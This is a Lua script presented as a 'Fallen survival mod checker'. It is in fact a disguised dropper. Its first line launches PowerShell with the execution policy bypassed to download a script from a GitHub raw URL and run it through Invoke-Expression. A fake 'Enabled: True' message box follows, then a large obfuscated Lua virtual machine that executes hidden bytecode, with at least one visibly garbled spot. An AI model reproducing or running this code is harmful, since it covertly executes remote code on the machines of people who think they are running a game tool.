os.execute('powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/monkeyadece/teste/refs/heads/main/ewqeq | iex"')
messagebox("Enabled: True | Made by monkeyadece", " Fallen survival mod checker",  48)
-- Made by monkey |2/21/2025| --
return(function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,z,z)local z,ba,bb,bc,bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn=106,85,63,54,32,61,90,35,87,36,86,59,45,54,80,20,18,73,42,30,99,60,75,22,66,82,61,41,89,90,64,88,82,13,33,79,94,70,77,58,10,85,82,12,47,49,87,53,36,60,40 while z~=80 do if ba>=788 then if ba<=1083 then if ba>=931 then if ba<=1021 then if ba>=978 then if ba>980 then ba=1041 cb=function(co,cp,cq,cr,cr)local cr cr=((co/2^(cp-1))%2^((cq-1)-(cp-1)+1))do return(cr-cr%1);end end else ba=1021 cm=(bit_lib and bit_lib.bxor or function(co,cp)co=co%(2^32)cp=cp%(2^32)local cq,cr=0,1 while co>0 and cp>0 do local cs,ct=co%16,cp%16 cq=cq+bl[cs+1][ct+1]*cr co=(co-cs)/16 cp=(cp-ct)/16 cr=cr*16 end cq=cq+co*cr+cp*cr return cq end)end else cj=function(co,cp,cq,cr)local cr,cs,ct=64,57,44,65,57,94,45,63,13,29,75,42,50 while cr~=35 do if cs<=120 then if cs<=57 then cs=77 ct=nil else if cs>83 then ct=((cp/bz[co])%bz[cq])cs=150 else ct=nil cs=120 end end else if cs>=190 then if cs<223 then cs=227 do return ct end else cr=35;end else ct=(ct-ct%1)cs=190 end end end end ba=978 end else if ba<=1041 then do bj=1 end ba=1064 else if ba>1066 then ba=1128 do br=function()local co co=bq(bi,bj,bj)bj=(bj+1);return co;end end else ba=1083 do cg=function()local co,cp,cq,cr cq,co,cp,cr=bq(bi,bj,(bj+3))bj=(bj+4);return((cr*16777216)+(cp*65536)+(co*256)+cq);end end end end end else if ba<=817 then if ba<814 then ba=817 do bo=''end else do bn=(2^52)end ba=844 end else if ba>=867 then if ba<893 then ca=2 ba=898 else for co=1,31 do bz[co]=ca do ca=(ca*2)end end ba=931 end else bz={[0]=1}ba=867 end end end else if ba<=1288 then if ba>=1213 then if ba>=1259 then if ba<1286 then ba=1288 cc=function(...)return{...},bt('#',...)end else bg={}ba=1316 end else ba=1259 bp=function(co,co)local co,cp,cq,cr=76,50,20,15,18,50,20,35,11,99,70,60,70 while co~=37 do if cp>=151 then if cp<=151 then cp=178 bj=(bj+cq);else if cp<196 then cp=202 return cr;else co=37;end end else if cp>=79 then if cp>86 then cr=bi:sub(bj,(bj+cq-1))cp=151 else cq=cg()cp=121 end else cq,cr=nil cp=79 end end end end end else if ba>1134 then bs=function()local co,cp,cq,cr,cs,ct,cu,cv=44,62,86,93,35,40,38,30,33,21,55,11,16,74,65,85,84,12,11,48,33 while co~=33 do if cp>=220 then if cp<=290 then if cp>=265 then if cp<282 then cv=(cj(0,cr,20)*4294967296+cs)cp=290 else cu=1 cp=327 end else cq=cj(20,cr,11)cp=265 end else if cp>=353 then if cp<376 then cp=380 return(ct*(2^(cq-1023))*(cv/bn+cu))else co=33;end else do if not(cq~=u)then if not(cv==0)then cq=1 cu=0 else return(ct*0)end elseif 2047~=cq then else if 0==cv then do do return(ct*(0/0))end end else return(ct*(1/0))end end end cp=353 end end else if cp<=90 then if cp<87 then cp=90 cq,cr,cs,ct,cu,cv=nil else do cs=cg()end cp=136 end else if cp>=183 then if cp<191 then if((cs==0 and cr==0))then return 0 end cp=200 else ct=((-1)^cj(31,cr,1))cp=220 end else cr=cg()cp=183 end end end end end ba=1213 else bc=function()local u,co do u,co=bq(bi,bj,(bj+2))end bj=(bj+2);return((co*256)+u);end ba=1171 end end else if ba>=1423 then if ba<=1423 then bm=function(u,co,cp,cq)local cq,cr,cs,ct,cu cu=u[35]cq=by do ct=u[83]end do cs=u[32]end cr=u[48]return function(...)local u,cq,cv,cw,cx,cy,cz,da,db db=1 do cq=-1 end da=-1 do cx={}end cv={...}cz=(bt('#',...)-1)do u={}end cy={}for da=0,cz do if(not(da<cr))then cx[(da-cr)]=cv[(da+1)];else cy[da]=cv[(da+1)];end;end;cw=(cz-cr+1)while true do local cw,da,dc,dd,de,df,dg,dh,di,dj do da=cs[db]end do dd=da[73]end dg=da[64]do cw=da[21]end do dc=da[150]end dh=da[30]do de=da[134]end dj=da[51]di=da[120]do df=da[175]end if not(da[73]<51)then do if not(dd<77)then if not(dd>89)then do if not(dd<83)then if not(dd<86)then if not(dd<88)then if(dd>88)then for dg=cw,di do cy[dg]=d;end;else local d d=da[21]cy[d]=cy[d]();end else if(dd>86)then local d d=cw cy[d]=cy[d](cy[d+1]);else local d,dg,dk dg=cu[di]d=nil do dk={}end d=ch({},{__index=function(dl,dl)local dl=dk[dl];return dl[1][dl[2]];end,__newindex=function(dl,dl,dm)local dl=dk[dl]dl[1][dl[2]]=dm;end;});do for dl=1,da[30]do local dm dm=da[60][dl]if dm[1]then dk[(dl-1)]={cy,dm[2],nil,nil,nil};else dk[(dl-1)]={co,dm[2],nil};end;u[(#u+1)]=dk;end;end cy[cw]=bm(dg,d,cp);end end else if not(dd>83)then local d,dg,dk dg=cw d={cy[dg](bb(cy,dg+1,di))}dk=0 for dl=dg,dh do dk=(dk+1);cy[dl]=d[dk];end else if(dd<85)then do by[cw]=by[dc]end else do cy[cw]=bm(cu[di],nil,cp);end end end end else if not(dd<80)then do if not(dd<81)then if not(dd~=81)then cy[cw]=ct[di]else do cy[da[21]]=-cy[da[120]];end end else do cy[cw]=(cy[di]/ct[dh]);end end end else do if not(dd<f)then if(dd<79)then while(cy[da[21]]>cy[dh])do db=di;break end else do do return cy[da[51]][da[134]]end end end else cs[db]={[p]=2,[21]=15,[30]=0,[73]=dd-52,[134]=0};db=(db-1);end end end end end else if not(dd<96)then do if not(dd>98)then if not(dd<97)then if 97==dd then cy[cw]=cy[di][cy[dh]];else local d d=cw do do return cy[d](bb(cy,(d+1),di))end;end end else by[cw]={}end else if not(dd>100)then if(da[l]>99)then db=di;else cy[cw]=cy[da[120]][ct[dh]];end else do if(dd>101)then cy[da[cw]]=cy else local d,f,l,p f=cw l,d=cc(cy[f](cy[(f+1)]))cq=(d+f-1)p=0 for d=f,cq do p=(p+1);cy[d]=l[p];end;end end end end end else if not(da[73]<s)then if not(dd>93)then local d,f f=cw d={}if(#u>0)then do for l=1,#u do local p do p=u[l]end do for l=0,#p do local s,dg,dk do dg=p[l]end dk=dg[1]s=dg[2]do while dk==cy and s>=0 do d[s]=dk[s]dg[1]=d break end end end end end end end return cy[f],cy[(f+y)]else if not(dd~=94)then local d d=cw cy[d](bb(cy,(d+1),di))else local d d=cw cy[d](cy[(d+1)])end end else if not(dd>90)then if not cy[cw]then db=di;end;else if not(dd~=91)then db=((ct[cw]<cy[da[30]])and di or db)elseif(not(cy[cw]==cy[dh]))then db=di;end end end end end else if not(dd>63)then if not(dd<57)then if not(dd>59)then if not(dd<58)then if(dd<59)then cy[da[21]]=(cy[di]%ct[dh]);else cy={};for d=0,cz do if(d<cr)then cy[d]=cv[(d+1)];else break end;end;end else local d,f,l,p do d=cw end f=((da[30]-1)*50)p=cy[d]do l=di end for s=1,l do p[(f+s)]=cy[(d+s)]end;end else do if not(dd>61)then if(dd<61)then do do return cy[cw]();end;end else end else if 62==dd then local d,f d=cw f={}for l=1,#u do local p p=u[l]for l=0,#p do local s,y,cr cr=p[l]s=cr[1]y=cr[2]if(s==cy and y>=d)then do f[y]=s[y];end cr[1]=f;end;end;end;else cy[cw]=by[dc]end end end end else do if not(dd>53)then do if not(dd>51)then cy[df]=(function()cy[cw]=bm(cu[dc],nil,cp);end)else if(dd>52)then co[di]=cy[cw];else cy[cw]=#cy[di];end end end else do if not(da[73]>54)then db=((cy[cw]~=cy[da[30]])and di or db)else if not(dd~=55)then do cy[da[21]]=(cy[di]*ct[dh]);end else cy[cw]=cy[di]end end end end end end else if not(dd>69)then if not(da[73]>66)then if not(dd>64)then cy[cw]=co[da[120]];else if(dd>65)then cy[df]=(function()cy[da[21]]=bm(cu[dc],nil,cp);end)else while((cy[cw]~=ct[da[t]]))do db=di;break end end end else if not(dd>67)then local d,f d=da[21]do f=cy[da[120]]end cy[(d+1)]=f;do cy[d]=f[cy[dh]];end else if not(da[73]~=68)then cp=cy[da[cw]]else cy[cw]=(cy[di]/cy[dh]);end end end else do if not(dd<73)then if not(dd<75)then if(da[73]>75)then do cy[cw]=by[dc]end else cy[cw]=(0~=di);do db=(db+1);end end else do if(dd>73)then cy[cw]=(cy[di]^cy[da[30]]);else if((cy[da[21]]<cy[dh]))then db=di;end;end end end else if not(dd>70)then cs[db]={[73]=dd- -11,[30]=40,[21]=1,[134]=0,[120]=1};db=(db-1);else if not(da[73]~=71)then local d,f,l l=cw d={cy[l](bb(cy,l+1,cq))}f=0 for p=l,dh do f=(f+1);cy[p]=d[f];end else local d,f,l f=cw d=cy[(f+2)]l=(cy[f]+d)cy[f]=l;if((d>0))then if(not(l>cy[f+1]))then db=da[120];cy[(f+3)]=l;end elseif(not(l<cy[f+1]))then do db=di;end cy[(f+3)]=l;end end end end end end end end end else if not(dd<25)then if not(dd>37)then do if not(da[73]<31)then if not(dd<34)then if not(dd>o)then if 34==dd then local d,f f=cw do d={}end do if(#u>0)then for l=1,#u do local o o=u[l]for l=0,#o do local p,s,t t=o[l]p=t[1]s=t[2]if(p==cy and s>=0)then d[s]=p[s]do t[1]=d end end end end end end return bb(cy,f,cq);else cy[cw]=(cy[di]+cy[dh]);end else if(dd>36)then do cy[da[21]]=(cy[da[120]]+ct[dh]);end else do cy[cw]();end end end else if not(dd>31)then db=((cy[cw]<cy[dh])and di or db)else if not(dd~=32)then local d d=cw cy[d]=cy[d](bb(cy,d+1,cq));else local d d={}if(#u>0)then for f=1,#u do local l l=u[f]for f=0,#l do local o,p,s o=l[f]do p=o[1]end s=o[2]while p==cy and s>=0 do d[s]=p[s]o[1]=d break end end end end return dd;end end end else if not(da[73]<28)then if not(dd>28)then else if(dd>29)then local d,f do f=di end d=cy[f]for l=(f+1),dh do d=(d..cy[l]);end;cy[cw]=d;else do by[cw]=cy[dc]end end end else if not(dd<26)then do if(dd<27)then cy[cw]=(not cy[di]);else cs[db]={[73]=da[73]-24,[134]=0,[21]=1,[120]=58,[30]=2};do db=(db-1);end end end else do return cy[cw]end end end end end else if not(dd<44)then if not(dd<47)then if not(dd>48)then if(dd<48)then cy[cw]=cp[ct[di]];else cy[cw]=(cy[di]%cy[dh]);end else if(dd<50)then local d,f,l f=cw d=cy[f]l=di for o=1,l do d[o]=cy[(f+o)]end;else cy[da[21]]=nil;end end else if not(da[73]>44)then if cy[cw]then db=da[120];end;else if(dd<46)then cy[da[21]]=(cy[di]-cy[dh]);else do if((ct[cw]<cy[da[v]]))then do db=di;end end;end end end end else if not(da[73]>40)then if not(da[73]<39)then if(dd<40)then if not cy[dh]then cy[da[21]]=cy[dh];db=di;end;else cy[cw]={};end else local d,f,l l=cw f={cy[l](cy[l+1])}d=0 for o=l,dh do d=(d+1);do cy[o]=f[d];end end end else do if not(dd<42)then if(dd<43)then local d,f f=cw d=cy[di]cy[(f+1)]=d;do cy[f]=d[ct[dh]];end else cq=da[cw];end else local d d=cw do return bb(cy,d,(d+di))end;end end end end end else if not(dd>11)then do if not(dd<6)then if not(dd>8)then if not(dd<7)then if not(dd~=7)then local d,f f=cw d=di for l=f,d do cy[l]=cx[(l-f)];end;else local d,f,l,o,p d=cw do o=dh end do f=(d+2)end p={cy[d](cy[d+1],cy[f])}for s=1,o do cy[(f+s)]=p[s]end l=cy[(d+3)]if l then do cy[f]=l end else db=da[120];end;end else cs[db]=bg[de];db=di;end else if not(dd>9)then cp[ct[di]]=cy[cw];else if(da[73]>10)then do while(ct[cw]<=cy[dh])do db=di;break end end else by=cy end end end else if not(dd>2)then if not(dd<1)then if not(dd~=1)then ct=by[cw](ct)else local d,f f,d=cc(...)for d=1,cw do cy[(d-1)]=f[d]end end else cy[cw]=cy[di];end else do if not(dd<4)then if 4==dd then cy[cw]=(cy[di]*cy[da[30]]);else local d d=cw cy[d]=cy[d](bb(cy,d+1,di));end else do cy[cw][ct[di]]=ct[dh];end end end end end end else if not(dd>17)then if not(dd<15)then if not(dd>15)then if cw then cw=false;dh=di;db=(db-1);else db=(db+di+dh);end else if not(dd~=16)then if(not(cy[cw]<cy[dh]))then db=di;end;else do cy[da[21]]=(0~=da[120]);end end end else if not(dd>12)then else if not(dd~=13)then local d,f,l,o do f=cw end l,d=cc(cy[f](bb(cy,(f+x),di)))cq=(d+f-1)o=0 for d=f,cq do o=(o+1);do cy[d]=l[o];end end;else by[cw]()end end end else if not(dd<21)then if not(dd>r)then if not(dd~=21)then cy[df]();else do cy[cw][cy[di]]=cy[dh];end end else if(da[73]<24)then cy[cw]=cp[ct[di]][ct[da[30]]];else local d,f,l do f=da[21]end d=cy[f]l=cy[(f+2)]do if((l>0))then if((d>cy[f+1]))then db=di;else cy[(f+3)]=d;end elseif((d<cy[f+1]))then db=di;else cy[(f+3)]=d;end end end end else do if not(dd>18)then do cy[cw][cy[di]]=ct[dh];end else do if(dd<20)then local d do d=cy[dj][de]end cy[dj][de]=(d..cy[dh]);else cs[db]=bg[de];db=di;end end end end end end end end end db=(db+1);end;end;end ba=1465 else if ba>1473 then z=80;else ba=1493 return bm(bh(ci()),{},ci())();end end else if ba>=1361 then if ba>1368 then do bv={}end ba=1423 else by={}ba=1381 end else ba=1361 bh=function(d,f)local f,l,o,p,r,s,t,u=81,59,67,51,60,44,44,13,29,86,88,25,71,79,36,76,83,99,54,27,96,68,15,55,40 while f~=53 do if l<=280 then if l>=186 then if l>=248 then if l>252 then r[32]=u;l=302 else l=280 for f=q,cg()do local q,v,x,y,z,co=65,29,53,48,28,23,41,40,18,27,44,14,16,87,52,21,79,63,12,59,62,44,22,76,12,97 while q~=44 do if v<=304 then if v<=144 then if v<=64 then if v>31 then v=103 do y={{},nil,nil,nil,nil}end else v=64 x,y,z,co=nil end else if v<140 then y[64]=br();v=144 else y[60]={};v=183 end end else if v<=203 then if v<200 then v=203 if 1==br()then do for cp=1,br()do y[60][cp]={br()==0,cg()}end end end else v=238 co=cg()end else if v<=238 then v=257 x=cg()else if v>264 then y[95]=z v=320 else v=304 z=cb(co,1,2)end end end end else if v>=454 then if v>=510 then if v<=510 then y[175]=-y[30]v=548 else if v>557 then q=44;else v=584 do u[f]=y;end end end else if v>461 then y[51]=-y[21]v=510 else y[h]=cb(co,12,20);v=491 end end else if v>=374 then if v>381 then v=454 y[30]=cb(co,21,29);else y[120]=cb(x,12,33);v=418 end else if v<336 then v=343 y[73]=cb(x,1,11);else do y[21]=cb(co,3,11);end v=374 end end end end end end end else if l>188 then do for f=(#bg+1),(#bg+s)do local h,q,v,x,y=61,63,68,49,80,34,81,44,72,57,27,18,80,86,82,40,32,98,65,40,10,36 while h~=44 do if q>=306 then if q>=412 then if q>=463 then if q<488 then q=494 bg[f]=v;else break end else if q>417 then v[175]=-v[30]q=463 else v[51]=-v[21]q=435 end end else if q<=330 then if q>314 then q=349 v[150]=cb(x,12,20);else q=330 do v[21]=cb(x,3,11);end end else if q>353 then v[120]=cb(y,12,33);q=412 else do v[30]=cb(x,21,29);end q=369 end end end else if q<=161 then if q<=90 then if q<88 then v,x,y=nil q=90 else do v={}end q=122 end else if q>129 then q=177 x=cg()else v[64]=br();q=161 end end else if q>=228 then if q<251 then v[95]=cb(x,1,2);q=257 else q=306 v[73]=cb(y,1,11);end else if q<199 then y=cg()q=207 else q=228 v[134]=br();end end end end end end end l=248 else do s=cg()end l=209 end end else if l<=99 then if l<96 then o,p,r,s,t,u=nil l=99 else u={}l=114 end else if l>118 then r={}l=186 else p={}l=149 end end end else if l>=452 then if l>=522 then if l<=522 then l=562 r[48]=br();else if l<571 then l=577 return r;else break end end else if l<492 then l=494 for f=1,cg()do do p[f-1]=bh();end end else l=522 r[35]=p;end end else if l>=383 then if l<428 then l=431 for f=1,o do local h,p,q,s=75,40,73,19,62,92,61,78,12,19,66,85,79 while h~=44 do if p<=93 then if p>=67 then if p>70 then q=nil p=124 else p=93 do s=br()end end else q,s=nil p=67 end else if p>=149 then if p<179 then p=182 t[f]=q;else h=44;end else p=149 if(2==s)then q=(0~=br());elseif(1==s)then q=bs();elseif(0==s)then do q=bp();end elseif(4==s)then q=d[bp()];end;end end end end else do r[83]=t end l=452 end else if l>310 then l=383 t={}else l=347 o=cg()end end end end end end end end end end else if ba<=420 then if ba>=270 then if ba>=349 then if ba<=349 then ba=381 bd=math.ldexp else if ba<413 then ci=(getfenv or function()return _ENV end)ba=420 else ba=459 do ch=setmetatable end end end else if ba<=270 then bx=string.rep ba=309 else if ba<328 then ba=330 cl=table.concat else ba=349 ce=table.insert end end end else if ba>=153 then if ba>=192 then if ba<231 then bf=string.sub ba=240 else ba=270 bk=string.gsub end else ba=192 bw=string.char end else if ba<102 then bb,bc,bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn=nil ba=106 else ba=153 do bq=string.byte end end end end else if ba<=608 then if ba>=541 then if ba>=568 then if ba<601 then be=math.abs ba=608 else do ck=math.floor end ba=625 end else cf=(function(d,f,f,f)if not(cn(d)~='number')then do return true end else return false end end)ba=568 end else if ba>465 then cn=type ba=541 else bt=select ba=500 end end else if ba>=725 then if ba<=725 then for d=0,255 do bu[d]=bw(d);end ba=746 else if ba>751 then ba=788 bl={{0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,},{1,0,3,2,5,4,7,6,9,8,11,10,13,12,15,14,},{2,3,0,1,6,7,4,5,10,11,8,9,14,15,12,13,},{3,2,1,c,7,6,5,4,n,10,9,8,15,14,13,12,},{4,5,6,7,0,1,2,3,12,13,14,15,8,9,10,11,},{g,4,7,6,1,w,3,2,13,12,15,14,9,8,11,10,},{6,7,4,5,2,3,0,1,14,15,12,13,10,11,8,9,},{7,6,5,4,3,2,1,0,15,14,13,12,11,10,9,i,},{8,9,m,11,12,b,14,15,0,1,2,3,4,5,6,7,},{9,8,11,10,13,12,15,14,1,0,3,2,5,4,7,6,},{10,11,8,9,14,15,12,13,2,e,0,1,6,7,4,5,},{11,10,9,8,15,14,13,12,3,j,1,0,7,6,5,4,},{12,13,14,15,8,9,k,11,4,5,6,7,0,1,2,3,},{13,12,15,14,9,8,11,10,5,4,7,6,1,0,3,2,},{14,15,12,13,10,11,8,9,6,7,4,5,2,3,0,1,},{15,14,13,12,11,10,9,8,7,a,5,4,3,2,1,0,},nil}else do bi=bkfunction(a,b)return bu[cd(a,16)]end)end ba=761 end end else if ba<=625 then bb=(unpack or table.unpack)ba=667 else if ba>673 then bu={}ba=725 else cd=tonumber ba=709 end end end end end end end end)(6,13,0,nil,3,78,5,134,8,2,10,73,10,11,35,120,1,22,93,30,0,30,0,1,1)
